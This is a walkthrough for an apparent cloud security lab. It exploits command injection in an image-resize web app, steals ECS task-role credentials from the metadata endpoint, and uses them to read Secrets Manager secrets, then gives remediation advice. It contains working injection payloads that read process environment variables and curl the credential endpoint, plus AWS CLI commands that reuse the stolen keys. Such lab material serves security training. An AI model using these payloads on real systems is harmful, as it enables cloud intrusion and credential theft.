# Walkthrough

## Step 1: Reconnaissance

Access the web application and identify its functionality.

```bash
# Get the URL from Terraform output
cd terraform
terraform output webapp_url
```

Open the URL in your browser to see the **ResizeCloud** image resizing service.

![ResizeCloud Homepage](./images/resizecloud-homepage.png)

Key observations:
- States it uses ImageMagick ("Powered by ImageMagick")
- Image upload + dimensions input field
- "Running on AWS ECS" hint
- Stats: 10M+ Images Processed, 99.9% Uptime, 50ms Avg Response

## Step 2: Normal Functionality Test

Test the normal image resize functionality.

> **Note:** This service actually resizes images, so **any image will work**. You can upload any PNG, JPG, GIF, or other image file from your local machine.

### Method 1: Using Browser

1. Open the ResizeCloud page in your web browser
2. Click "Choose File" button → Select any image file
3. Enter `100x100` in the "Output Dimensions" field
4. Click "Resize Image" button
5. The resized image will be downloaded

### Method 2: Using CLI

```bash
# Create a test 1x1 PNG image (or use any image file)
echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > /tmp/test.png

# Test normal resize
curl -s -X POST "http://<ALB_URL>/resize" \
  -F "image=@/tmp/test.png" \
  -F "dimensions=100x100" \
  -o /tmp/result.png

file /tmp/result.png
# Output: /tmp/result.png: PNG image data, 100 x 100, ...
```

The image is resized successfully.

## Step 3: Vulnerability Discovery

Test for Command Injection by inserting shell commands in the dimensions field.

We can infer that ImageMagick's `convert` command is executed like this:
```bash
convert input.png -resize {dimensions} output.png
```

Using `$()` syntax, the command output is passed to the `-resize` argument and included in the error message.

### Method 1: Using Browser

1. Select any image file
2. Enter the following payload in the "Output Dimensions" field:
   ```
   $(cat /proc/self/environ | tr '\0' '\n' | grep AWS_CONTAINER | head -1)
   ```
3. Click "Resize Image" button

![Command Injection Input](./images/resizecloud-command-injection-input.png)

The environment variable is exposed in the error message:

![Command Injection Result](./images/resizecloud-command-injection-result.png)

### Method 2: Using CLI

```bash
# Command Injection test - check environment variables
curl -s -X POST "http://<ALB_URL>/resize" \
  -F "image=@/tmp/test.png" \
  -F "dimensions=\$(cat /proc/self/environ | tr '\0' '\n' | grep AWS_CONTAINER | head -1)" \
  2>&1 | grep -oE "Processing failed:[^<]*"
```

Output:
```
Processing failed: convert: invalid argument for option '-resize': AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx @ error/...
```

**Command Injection vulnerability confirmed!** The environment variable `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` is exposed.

## Step 4: ECS Task Role Credential Extraction

Extract Task Role credentials from the ECS container metadata service.

ECS metadata endpoint: `http://169.254.170.2` + `$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`

### Method 1: Using Browser

1. Select any image file
2. Enter the following payload in the "Output Dimensions" field (use the CRED_URI obtained in Step 3):
   ```
   $(curl -s http://169.254.170.2/v2/credentials/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx | base64 | tr -d '\n')
   ```
3. Click "Resize Image" button

![Credential Extraction Input](./images/resizecloud-credential-extraction-input.png)

The base64-encoded credentials are exposed in the error message:

![Credential Extraction Result](./images/resizecloud-credential-extraction-result.png)

### Method 2: Using CLI

```bash
# Credential URI (obtained in Step 3)
CRED_URI="/v2/credentials/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

# Extract credentials (base64 encoded to get full JSON)
curl -s -X POST "http://<ALB_URL>/resize" \
  -F "image=@/tmp/test.png" \
  -F "dimensions=\$(curl -s http://169.254.170.2${CRED_URI} | base64 | tr -d '\n')" \
  2>&1 | grep -oE "Processing failed:[^<]*" | \
  sed "s/Processing failed: convert: invalid argument for option '-resize': //" | \
  sed "s/ @ error.*//"
```

### Decode base64

Decode the base64 string from the output:
```bash
echo "<base64_string>" | base64 -d | jq .
```

Result:
```json
{
  "RoleArn": "arn:aws:iam::123456789012:role/gnawlab-secrets-task-role-xxxxxxxx",
  "AccessKeyId": "ASIAYLHCQFX5XXXXXXXX",
  "SecretAccessKey": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "Token": "IQoJb3JpZ2luX2VjEEwa...(truncated)...==",
  "Expiration": "2026-05-01T01:27:25Z"
}
```

## Step 5: AWS CLI Configuration

Configure AWS CLI with the obtained temporary credentials.

```bash
# Set as environment variables (recommended)
export AWS_ACCESS_KEY_ID="ASIAYLHCQFX5XXXXXXXX"
export AWS_SECRET_ACCESS_KEY="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEEwa...(truncated)...=="
export AWS_DEFAULT_REGION="us-east-1"
```

Or configure as a profile:
```bash
aws configure --profile victim
# AWS Access Key ID: ASIAYLHCQFX5XXXXXXXX
# AWS Secret Access Key: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
# Default region name: us-east-1
# Default output format: json

# Set Session Token (required for temporary credentials)
aws configure set aws_session_token "IQoJb3JpZ2luX2VjEEwa...(truncated)...==" --profile victim
```

## Step 6: Identity Verification

Verify the current credential identity.

```bash
aws sts get-caller-identity
```

Output:
```json
{
    "UserId": "AROAYLHCQFX57CPVCEJCP:4789286fb6b1495888b4297bae00faf2",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/gnawlab-secrets-task-role-xxxxxxxx/4789286fb6b1495888b4297bae00faf2"
}
```

Confirmed authentication as ECS Task Role (`gnawlab-secrets-task-role-xxxxxxxx`).

## Step 7: IAM Permission Enumeration

Check what permissions the Task Role has.

```bash
# Extract role name from Step 6 ARN
ROLE_NAME="gnawlab-secrets-task-role-xxxxxxxx"

# List inline policies
aws iam list-role-policies --role-name $ROLE_NAME
```

Output:
```json
{
    "PolicyNames": [
        "gnawlab-secrets-task-policy-xxxxxxxx"
    ]
}
```

An inline policy exists. Check its contents.

```bash
# Get inline policy details
aws iam get-role-policy --role-name $ROLE_NAME --policy-name gnawlab-secrets-task-policy-xxxxxxxx
```

Output:
```json
{
    "RoleName": "gnawlab-secrets-task-role-xxxxxxxx",
    "PolicyName": "gnawlab-secrets-task-policy-xxxxxxxx",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "IAMEnumeration",
                "Effect": "Allow",
                "Action": [
                    "iam:GetRole",
                    "iam:ListRolePolicies",
                    "iam:ListAttachedRolePolicies",
                    "iam:GetRolePolicy"
                ],
                "Resource": "arn:aws:iam::*:role/gnawlab-secrets-task-role-xxxxxxxx"
            },
            {
                "Sid": "SecretsManagerFullAccess",
                "Effect": "Allow",
                "Action": [
                    "secretsmanager:GetSecretValue",
                    "secretsmanager:DescribeSecret",
                    "secretsmanager:ListSecrets"
                ],
                "Resource": "*"
            },
            {
                "Sid": "KMSDecrypt",
                "Effect": "Allow",
                "Action": [
                    "kms:Decrypt",
                    "kms:DescribeKey"
                ],
                "Resource": "arn:aws:kms:us-east-1:123456789012:key/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
            }
        ]
    }
}
```

**Vulnerability found!** The `SecretsManagerFullAccess` statement has `Resource: "*"`, allowing **access to all secrets** (Overprivileged).

```bash
# Check attached managed policies (none)
aws iam list-attached-role-policies --role-name $ROLE_NAME
```

Output:
```json
{
    "AttachedPolicies": []
}
```

No managed policies are attached. Only inline policy is in use.

## Step 8: Secrets Manager Enumeration

List secrets in Secrets Manager.

```bash
aws secretsmanager list-secrets
```

Output:
```json
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:123456789012:secret:gnawlab-secrets-flag-xxxxxxxx-XXXXXX",
            "Name": "gnawlab-secrets-flag-xxxxxxxx",
            "Description": "Production database credentials - DO NOT SHARE",
            "Tags": [
                {"Key": "Application", "Value": "ResizeCloud"},
                {"Key": "Environment", "Value": "production"}
            ]
        }
    ]
}
```

Found the `gnawlab-secrets-flag-xxxxxxxx` secret.

## Step 9: Flag Extraction

Extract the secret value.

```bash
aws secretsmanager get-secret-value \
  --secret-id gnawlab-secrets-flag-xxxxxxxx \
  --query 'SecretString' \
  --output text | jq .
```

Output:
```json
{
  "api_key": "sk-resizecloud-prod-a1b2c3d4e5f6",
  "db_host": "prod-db.internal.resizecloud.com",
  "db_name": "resizecloud_prod",
  "db_password": "SuperSecretP@ssw0rd!",
  "db_port": 5432,
  "db_user": "admin",
  "flag": "FLAG{ecs_task_role_to_secrets_manager_pwned}"
}
```

Extract only the FLAG:
```bash
aws secretsmanager get-secret-value \
  --secret-id gnawlab-secrets-flag-xxxxxxxx \
  --query 'SecretString' \
  --output text | jq -r '.flag'
```

Output:
```
FLAG{ecs_task_role_to_secrets_manager_pwned}
```

---

## Attack Chain Summary

```
1. Web Application (ResizeCloud)
   ↓ Command Injection via dimensions parameter ($() syntax)
2. Environment Variable Leak
   ↓ AWS_CONTAINER_CREDENTIALS_RELATIVE_URI exposed in error message
3. ECS Metadata Service (169.254.170.2)
   ↓ curl to credential endpoint, base64 encode for full extraction
4. Task Role Temporary Credentials
   ↓ AccessKeyId, SecretAccessKey, Token
5. AWS CLI Configuration
   ↓ Export as environment variables
6. sts:GetCallerIdentity
   ↓ Confirm assumed role identity
7. iam:ListRolePolicies
   ↓ Discover inline policy name
8. iam:GetRolePolicy
   ↓ Analyze policy - find SecretsManagerFullAccess with Resource: "*"
9. iam:ListAttachedRolePolicies
   ↓ Confirm no managed policies attached
10. secretsmanager:ListSecrets
    ↓ Discover target secret
11. secretsmanager:GetSecretValue
    ↓
12. FLAG{ecs_task_role_to_secrets_manager_pwned}
```

---

## Key Techniques

### Command Injection Payload

```bash
# Include environment variable in error message
dimensions=$(cat /proc/self/environ | tr '\0' '\n' | grep AWS_CONTAINER | head -1)

# Base64 encode command output for full extraction
dimensions=$(curl -s http://169.254.170.2/v2/credentials/... | base64 | tr -d '\n')
```

### ECS Metadata vs EC2 IMDS

| | EC2 IMDSv2 | ECS Task Metadata |
|---|---|---|
| Endpoint | 169.254.169.254 | 169.254.170.2 |
| Token Required | PUT request for token | **None** |
| SSRF Protection | Token blocks SSRF | **No protection** |
| Credential Path | /latest/meta-data/iam/... | $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI |

---

## Lessons Learned

### 1. Input Validation
- Never pass user input directly to shell commands
- Use `subprocess.run([...], shell=False)` instead of `subprocess.run(cmd, shell=True)`
- Whitelist input validation (e.g., `^\d+x\d+$` regex)

### 2. Least Privilege Principle
- Use specific secret ARNs instead of `Resource: "*"` for ECS Task Roles
- Grant only the minimum required permissions

### 3. Secrets Management
- Restrict access to only the secrets the application actually needs
- Enable secret access logging and monitoring (CloudTrail)

### 4. Defense in Depth
- Block Command Injection patterns with WAF
- Restrict metadata service access from within containers
- Limit Secrets Manager access with VPC Endpoint policies

---

## Remediation

### Secure Code Example

```python
import re
import subprocess

def resize_image(input_path, dimensions, output_path):
    # Input validation - whitelist approach
    if not re.match(r'^\d+x\d+$', dimensions):
        raise ValueError("Invalid dimensions format. Use WIDTHxHEIGHT (e.g., 800x600)")
    
    # Execute command with shell=False - pass arguments as list
    subprocess.run(
        ['convert', input_path, '-resize', dimensions, output_path],
        shell=False,
        check=True
    )
```

### Least Privilege IAM Policy

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["secretsmanager:GetSecretValue"],
      "Resource": "arn:aws:secretsmanager:us-east-1:*:secret:resizecloud-app-config-*"
    }
  ]
}
```

### Additional Security Measures

1. **AWS WAF Rules**: Block Command Injection patterns
2. **CloudTrail Monitoring**: Log Secrets Manager access
3. **GuardDuty**: Detect anomalous API calls
4. **VPC Endpoint Policy**: Allow access only to specific secrets
